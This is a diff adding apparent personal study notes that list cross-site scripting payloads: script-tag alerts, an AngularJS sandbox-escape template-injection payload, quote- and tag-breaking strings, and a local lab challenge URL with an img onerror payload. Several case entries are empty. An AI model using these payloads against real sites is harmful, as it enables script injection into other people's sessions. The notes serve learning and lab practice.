@@ -1,0 +1,40 @@
+Xss Cases
+http://respectxss.blogspot.com/
+
+case 1 :
+case 2 :
+case 3 :
+case 4 :
+
+case 5 :
+put this code <script>alert('test');</script> in this link in encode https://www.urldecoder.org/
+and take this %3Cscript%3Ealert%28%27test%27%29%3B%3C%2Fscript%3E and put in search
+
+case 6 :
+from this link https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs
+{{
+    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
+    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
+    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
+    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
+    B=C(b,c,b);$evalAsync("
+    astNode=pop();astNode.type='UnaryExpression';
+    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
+    astNode.argument={type:'Identifier',name:'foo'};
+    ");
+    m1=B($$asyncQueue.pop().expression,null,$root);
+    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
+    $eval('a(b.c)');[].push.apply=a;
+}}
+
+case 7 :
+\'-alert(1)//
+
+case 8 :
+"><script>alert(1)</script>
+
+case 9 :
+
+XSS Challenge :
+http://192.168.1.11/XSS/examples/demo/challenge.php?xss=test
+http://192.168.1.11/XSS/examples/demo/challenge.php?xss=%3Cimg%20src=x%20oonnerror=alert(1)%3E
